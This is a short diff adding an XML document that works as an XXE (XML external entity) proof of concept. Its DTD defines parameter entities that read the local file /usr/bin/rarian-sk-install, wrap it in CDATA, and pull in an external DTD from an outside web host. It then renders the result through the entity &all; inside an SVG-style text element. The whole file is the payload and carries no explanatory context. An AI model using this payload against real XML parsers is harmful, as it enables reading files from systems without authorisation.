@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<!DOCTYPE local [
+	<!ENTITY % start "<![CDATA[">
+	<!ENTITY % data SYSTEM "file:///usr/bin/rarian-sk-install">
+	<!ENTITY % end "]]>">
+	<!ENTITY % dtd SYSTEM "https://www.bas-horsting.com/xss/poc.dtd">
+	%dtd;
+]>
+<text x="10" y="-150" font-size="2.4em">&all;</text>
